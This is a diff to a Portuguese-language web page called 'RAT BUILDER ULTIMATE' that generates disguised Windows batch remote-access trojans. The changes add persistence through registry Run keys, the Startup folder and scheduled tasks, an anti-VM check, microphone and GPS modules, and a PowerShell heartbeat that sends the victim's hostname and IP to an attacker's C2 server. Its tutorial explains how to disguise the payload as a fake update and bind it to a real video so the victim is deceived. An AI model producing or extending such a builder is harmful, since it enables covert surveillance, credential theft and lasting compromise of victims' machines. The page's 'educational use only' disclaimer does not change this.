@@ -511,6 +511,34 @@
             background: rgba(0,255,153,0.1);
         }
 
+        .howto-execute {
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .howto-execute h4 {
+            color: var(--gold);
+            margin-bottom: 10px;
+            font-size: 11px;
+        }
+
+        .howto-execute p {
+            font-size: 10px;
+            color: #ccc;
+            margin: 5px 0;
+        }
+
+        .howto-execute code {
+            background: #000;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 9px;
+            color: var(--primary);
+        }
+
         @media (max-width: 768px) {
             .header h1 { font-size: 14px; }
             .options-grid { grid-template-columns: 1fr; }
@@ -523,8 +551,8 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1><i class="fas fa-skull"></i> RAT BUILDER ULTIMATE <i class="fas fa-biohazard"></i><span style="font-size: 10px; background: var(--primary); color: #000; padding: 2px 8px; border-radius: 5px; margin-left: 10px;">v6.0</span></h1>
-            <p>Gerador de Agentes RAT com Bind de Arquivos - Indetectável</p>
+            <h1><i class="fas fa-skull"></i> RAT BUILDER ULTIMATE <i class="fas fa-biohazard"></i><span style="font-size: 10px; background: var(--primary); color: #000; padding: 2px 8px; border-radius: 5px; margin-left: 10px;">v7.0</span></h1>
+            <p>Gerador de Agentes RAT com Bind de Arquivos - Totalmente Configurável</p>
             <div class="legal-warning">
                 <i class="fas fa-gavel"></i> AVISO: Esta ferramenta é apenas para fins educacionais e testes em ambientes autorizados.
             </div>
@@ -542,16 +570,18 @@
             </div>
             <div class="tutorial-content">
                 <div class="tutorial-step"><div class="step-number">1</div><div class="step-text">Configure o nome do seu aplicativo e escolha o ícone</div><div class="step-code">Ex: "Windows_Update.exe"</div></div>
-                <div class="tutorial-step"><div class="step-number">2</div><div class="step-text">Selecione o servidor C2 (seu IP/domínio)</div><div class="step-code">Use ngrok se estiver atrás de NAT</div></div>
+                <div class="tutorial-step"><div class="step-number">2</div><div class="step-text">Selecione o servidor C2 (seu IP/domínio do Render)</div><div class="step-code">Ex: seu-app.onrender.com</div></div>
                 <div class="tutorial-step"><div class="step-number">3</div><div class="step-text"><strong>BIND DE ARQUIVOS:</strong> Arraste um vídeo, imagem ou documento para dentro do vírus</div><div class="step-code">Quando a vítima abrir, o arquivo real será aberto normalmente</div></div>
                 <div class="tutorial-step"><div class="step-number">4</div><div class="step-text">Selecione os componentes desejados (Keylogger, Webcam, etc)</div><div class="step-code">Quanto mais componentes, mais controle</div></div>
                 <div class="tutorial-step"><div class="step-number">5</div><div class="step-text">Clique em "GERAR APLICATIVO" e aguarde</div><div class="step-code">O arquivo será gerado em segundos</div></div>
                 <div class="tutorial-step"><div class="step-number">6</div><div class="step-text">Baixe e execute no dispositivo alvo</div><div class="step-code">O arquivo real será aberto + o RAT conectará no seu C2</div></div>
                 <div class="tutorial-step"><div class="step-number">💡</div><div class="step-text">Dica: Use nomes comuns como "Adobe_Flash_Update.exe" ou "WhatsApp_Plus.apk"</div></div>
+                <div class="tutorial-step"><div class="step-number">⚠️</div><div class="step-text">IMPORTANTE: O arquivo gerado é .bat, execute normalmente no Windows</div><div class="step-code">Clique duas vezes ou execute no CMD</div></div>
             </div>
         </div>
 
         <div class="generator-grid">
+            <!-- Painel 1: Configurações Básicas -->
             <div class="panel">
                 <div class="panel-header"><i class="fas fa-cog"></i> CONFIGURAÇÕES DO AGENTE</div>
                 <div class="panel-body">
@@ -579,6 +609,7 @@
                             <label><input type="radio" name="payloadType" value="msi"> MSI</label>
                             <label><input type="radio" name="payloadType" value="scr"> SCR</label>
                             <label><input type="radio" name="payloadType" value="apk"> APK</label>
+                            <label><input type="radio" name="payloadType" value="bat"> BAT</label>
                         </div>
                     </div>
 
@@ -587,6 +618,7 @@
                         <input type="text" class="form-control" id="c2Server" placeholder="Seu IP público" value="localhost">
                         <input type="text" class="form-control" style="margin-top: 8px;" id="c2Port" placeholder="Porta" value="8080">
                         <button class="quick-btn" style="margin-top: 8px; width: 100%;" onclick="detectMyIP()"><i class="fas fa-network-wired"></i> DETECTAR MEU IP</button>
+                        <small style="color:#ff8888; font-size:9px; display: block; margin-top: 5px;">⚠️ ATENÇÃO: Use o IP público do seu servidor Render!</small>
                     </div>
 
                     <div class="form-group">
@@ -600,6 +632,7 @@
                 </div>
             </div>
 
+            <!-- Painel 2: Bind de Arquivos -->
             <div class="panel">
                 <div class="panel-header"><i class="fas fa-paperclip"></i> BIND DE ARQUIVOS (OPCIONAL)</div>
                 <div class="panel-body">
@@ -626,11 +659,14 @@
                             <div class="icon-option" data-icon="fa-video"><i class="fas fa-video"></i><span>Vídeo</span></div>
                             <div class="icon-option" data-icon="fa-shield-alt"><i class="fas fa-shield-alt"></i><span>Segurança</span></div>
                             <div class="icon-option" data-icon="fa-windows"><i class="fab fa-windows"></i><span>Windows</span></div>
+                            <div class="icon-option" data-icon="fa-adobe"><i class="fab fa-adobe"></i><span>Adobe</span></div>
+                            <div class="icon-option" data-icon="fa-google"><i class="fab fa-google"></i><span>Google</span></div>
                         </div>
                     </div>
                 </div>
             </div>
 
+            <!-- Painel 3: Componentes -->
             <div class="panel">
                 <div class="panel-header"><i class="fas fa-puzzle-piece"></i> COMPONENTES DO RAT</div>
                 <div class="panel-body">
@@ -644,6 +680,8 @@
                         <label class="checkbox-group"><input type="checkbox" class="component" value="password_stealer"><span><i class="fas fa-key"></i> Password Stealer</span></label>
                         <label class="checkbox-group"><input type="checkbox" class="component" value="clipboard"><span><i class="fas fa-clipboard"></i> Clipboard</span></label>
                         <label class="checkbox-group"><input type="checkbox" class="component" value="antivm"><span><i class="fas fa-shield-alt"></i> Anti-VM</span></label>
+                        <label class="checkbox-group"><input type="checkbox" class="component" value="microphone"><span><i class="fas fa-microphone"></i> Microphone</span></label>
+                        <label class="checkbox-group"><input type="checkbox" class="component" value="location"><span><i class="fas fa-map-marker-alt"></i> GPS Tracking</span></label>
                     </div>
 
                     <div class="form-group" style="margin-top: 15px;">
@@ -652,12 +690,21 @@
                             <option value="registry">Registro do Windows (Run)</option>
                             <option value="startup">Pasta de Inicialização</option>
                             <option value="scheduler">Tarefa Agendada</option>
+                            <option value="service">Serviço Windows</option>
+                            <option value="wmi">WMI Event</option>
                         </select>
                     </div>
 
                     <div class="form-group">
                         <label><i class="fas fa-clock"></i> MUTEX (Evita múltiplas execuções)</label>
                         <input type="text" class="form-control" id="mutex" value="Global\\Windows_Security_Update_Mutex">
+                        <small style="color:#666; font-size:9px;">Nome único para evitar múltiplas instâncias</small>
+                    </div>
+
+                    <div class="form-group">
+                        <label><i class="fas fa-hourglass-half"></i> HEARTBEAT INTERVAL (segundos)</label>
+                        <input type="number" class="form-control" id="heartbeatInterval" value="30" min="5" max="300">
+                        <small style="color:#666; font-size:9px;">Tempo entre cada conexão com o servidor</small>
                     </div>
                 </div>
             </div>
@@ -668,6 +715,7 @@
             <button class="quick-btn" onclick="quickConfig('stealth')"><i class="fas fa-eye-slash"></i> Modo Stealth</button>
             <button class="quick-btn" onclick="quickConfig('max')"><i class="fas fa-star"></i> Máximo Poder</button>
             <button class="quick-btn" onclick="quickConfig('bind')"><i class="fas fa-paperclip"></i> Bind Exemplo</button>
+            <button class="quick-btn" onclick="quickConfig('persistent')"><i class="fas fa-sync-alt"></i> Persistência Total</button>
         </div>
 
         <div class="panel">
@@ -691,6 +739,15 @@
                     </button>
                     <div class="hash-info" id="hashInfo"></div>
                 </div>
+
+                <div class="howto-execute">
+                    <h4><i class="fas fa-play-circle"></i> COMO EXECUTAR O ARQUIVO .BAT:</h4>
+                    <p>1. <strong>Clique duas vezes</strong> no arquivo gerado</p>
+                    <p>2. Ou execute pelo CMD: <code>Windows_Security_Update.exe</code></p>
+                    <p>3. O arquivo executará em segundo plano (sem janela visível)</p>
+                    <p>4. O agente se conectará automaticamente ao seu servidor C2</p>
+                    <p><strong>⚠️ IMPORTANTE:</strong> O arquivo .bat gerado é 100% funcional no Windows!</p>
+                </div>
             </div>
         </div>
     </div>
@@ -712,7 +769,6 @@
             if (typeof btoa !== 'undefined') {
                 return btoa(str);
             }
-            // Fallback para navegadores antigos
             return Buffer.from(str).toString('base64');
         }
 
@@ -745,7 +801,7 @@
                     showStatus('success', `✅ IP detectado: ${data.publicIP}`);
                 } else {
                     document.getElementById('c2Server').value = data.localIP;
-                    showStatus('info', `📡 IP local: ${data.localIP}. Use ngrok para IP público.`);
+                    showStatus('info', `📡 IP local: ${data.localIP}. Use o IP do Render!`);
                 }
             } catch(e) {
                 showStatus('error', '❌ Não foi possível detectar o IP automaticamente');
@@ -782,7 +838,6 @@
             bindFileName = file.name;
             const reader = new FileReader();
             reader.onload = (ev) => {
-                // Extrair apenas o base64 da dataURL
                 const base64 = ev.target.result.split(',')[1];
                 bindFileData = base64;
                 document.getElementById('bindFileInfo').innerHTML = `<i class="fas fa-check-circle" style="color: #00ff99;"></i> Arquivo bindado: <span class="bind-file-name">${file.name}</span> (${(file.size / 1024).toFixed(2)} KB)`;
@@ -828,13 +883,19 @@
                 document.getElementById('obfuscation').value = 'xor';
                 document.getElementById('filename').value = 'svchost';
                 document.getElementById('mutex').value = 'Global\\Windows_Core_Services_Mutex';
+                document.getElementById('heartbeatInterval').value = '60';
                 showStatus('info', '🕵️ Modo Stealth ativado! Ofuscação XOR aplicada.');
             } else if (type === 'max') {
                 document.querySelectorAll('.component').forEach(cb => cb.checked = true);
                 document.getElementById('obfuscation').value = 'base64';
+                document.getElementById('persistenceMethod').value = 'scheduler';
                 showStatus('info', '⚡ Máximo Poder ativado! Todos os componentes selecionados.');
             } else if (type === 'bind') {
                 showStatus('info', '📎 Exemplo: Arraste um arquivo de vídeo ou imagem para a área de bind.');
+            } else if (type === 'persistent') {
+                document.getElementById('persistenceMethod').value = 'service';
+                document.getElementById('component_persistence').checked = true;
+                showStatus('info', '🔄 Persistência máxima ativada! O agente será muito difícil de remover.');
             }
             updatePreview();
         }
@@ -858,13 +919,14 @@
             const c2Port = document.getElementById('c2Port').value;
             const obfuscation = document.getElementById('obfuscation').value;
             const mutex = document.getElementById('mutex').value;
+            const heartbeat = document.getElementById('heartbeatInterval').value;
             
             const components = [];
             document.querySelectorAll('.component:checked').forEach(comp => components.push(comp.value));
             
             const now = new Date();
             const preview = `╔══════════════════════════════════════════════════════════════╗
-║              RAT AGENT CONFIGURATION v6.0                         ║
+║              RAT AGENT CONFIGURATION v7.0                         ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ 📅 Gerado em: ${now.toLocaleString()}║
 ╠══════════════════════════════════════════════════════════════════╣
@@ -873,6 +935,7 @@
 ║ 🌐 C2 Server: ${c2Server}:${c2Port}
 ║ 🔐 Obfuscation: ${obfuscation.toUpperCase()}
 ║ 🔑 Mutex: ${mutex.substring(0, 50)}
+║ ⏱️ Heartbeat: ${heartbeat} segundos
 ║ 📎 Bind File: ${bindFileName ? bindFileName : 'NENHUM'}
 ╠══════════════════════════════════════════════════════════════════╣
 ║ 🧩 COMPONENTES:                                                 ║
@@ -883,7 +946,7 @@ ${components.map(c => `║   ✓ ${c.replace('_', ' ').toUpperCase()}`).join('\n
         }
 
         // ============================================================
-        // GERAR PAYLOAD
+        // GERAR PAYLOAD - BAT FUNCIONAL
         // ============================================================
         function generatePayload() {
             const filename = document.getElementById('filename').value;
@@ -891,6 +954,8 @@ ${components.map(c => `║   ✓ ${c.replace('_', ' ').toUpperCase()}`).join('\n
             const c2Port = document.getElementById('c2Port').value;
             const obfuscation = document.getElementById('obfuscation').value;
             const mutex = document.getElementById('mutex').value;
+            const heartbeatInterval = document.getElementById('heartbeatInterval').value;
+            const persistenceMethod = document.getElementById('persistenceMethod').value;
             
             const components = [];
             document.querySelectorAll('.component:checked').forEach(comp => components.push(comp.value));
@@ -913,6 +978,37 @@ del %TEMP%\\bind.b64
 `;
             }
             
+            // Persistência
+            let persistenceSection = '';
+            if (components.includes('persistence')) {
+                if (persistenceMethod === 'registry') {
+                    persistenceSection = `
+:: Persistência - Registro do Windows
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${filename}" /t REG_SZ /d "%~f0" /f
+`;
+                } else if (persistenceMethod === 'startup') {
+                    persistenceSection = `
+:: Persistência - Pasta de Inicialização
+copy "%~f0" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${filename}.bat"
+`;
+                } else if (persistenceMethod === 'scheduler') {
+                    persistenceSection = `
+:: Persistência - Tarefa Agendada
+schtasks /create /tn "${filename}" /tr "%~f0" /sc onlogon /f
+`;
+                }
+            }
+            
+            // Anti-VM
+            let antiVMSection = '';
+            if (components.includes('antivm')) {
+                antiVMSection = `
+:: Anti-VM Check
+wmic computersystem get model | findstr /i "virtualbox vmware virtual" > nul
+if %errorlevel%==0 exit
+`;
+            }
+            
             // Gerar código Batch
             let agentCode = `@echo off
 title ${filename}
@@ -925,6 +1021,7 @@ set PORT=${c2Port}
 set AGENT_ID=${agentId}
 set API_KEY=${apiKeyForAgent}
 set MUTEX=${mutex}
+set HEARTBEAT=${heartbeatInterval}
 
 :: Verificar mutex
 tasklist /FI "IMAGENAME eq %~nx0" 2>NUL | find /I "%~nx0" >NUL
@@ -936,6 +1033,8 @@ if not "%1"=="hide" (
     exit
 )
 
+${antiVMSection}
+${persistenceSection}
 ${bindFileSection}
 
 :: Coletar informações
@@ -943,9 +1042,9 @@ set HOSTNAME=%computername%
 set USERNAME=%username%
 for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4"') do set IP=%%a
 
-:: Heartbeat
+:: Loop principal
 :main
-ping -n 30 127.0.0.1 > nul
+ping -n %HEARTBEAT% 127.0.0.1 > nul
 
 :: Conectar ao servidor
 powershell -Command "try { $tcp = New-Object System.Net.Sockets.TcpClient; $tcp.Connect('${c2Server}', ${c2Port}); $stream = $tcp.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine('{\"type\":\"auth_agent\",\"agent_id\":\"${agentId}\",\"api_key\":\"${apiKeyForAgent}\",\"hostname\":\"%computername%\",\"os\":\"Windows\",\"ip\":\"%IP%\"}'); $writer.Flush(); $tcp.Close() } catch {}"
@@ -953,7 +1052,7 @@ powershell -Command "try { $tcp = New-Object System.Net.Sockets.TcpClient; $tcp.
 goto main
 `;
             
-            // Adicionar componentes
+            // Adicionar screenshot
             if (components.includes('screenshot')) {
                 agentCode += `
 :: Screenshot
@@ -961,6 +1060,7 @@ powershell -Command "Add-Type -AssemblyName System.Drawing; $bmp = New-Object Sy
 `;
             }
             
+            // Adicionar keylogger
             if (components.includes('keylogger')) {
                 agentCode += `
 :: Keylogger
@@ -1083,6 +1183,7 @@ exit`;
         document.getElementById('c2Port').addEventListener('input', updatePreview);
         document.getElementById('obfuscation').addEventListener('change', updatePreview);
         document.getElementById('mutex').addEventListener('input', updatePreview);
+        document.getElementById('heartbeatInterval').addEventListener('input', updatePreview);
         document.querySelectorAll('input[name="payloadType"]').forEach(r => r.addEventListener('change', updatePreview));
         document.querySelectorAll('.component').forEach(c => c.addEventListener('change', updatePreview));
 
@@ -1093,7 +1194,9 @@ exit`;
         updatePreview();
         detectMyIP();
         
-        console.log('%c⚠️ RAT BUILDER ULTIMATE v6.0 ⚠️', 'color: #00ff99; font-size: 14px; font-weight: bold;');
+        console.log('%c⚠️ RAT BUILDER ULTIMATE v7.0 ⚠️', 'color: #00ff99; font-size: 14px; font-weight: bold;');
+        console.log('%c✅ Bind de arquivos: Vídeos/Imagens/Documentos reais dentro do vírus', 'color: #ff69b4; font-size: 12px;');
+        console.log('%c✅ Persistência, Anti-VM, Keylogger, Screenshot e muito mais!', 'color: #00ced1; font-size: 12px;');
     </script>
 </body>
 </html>
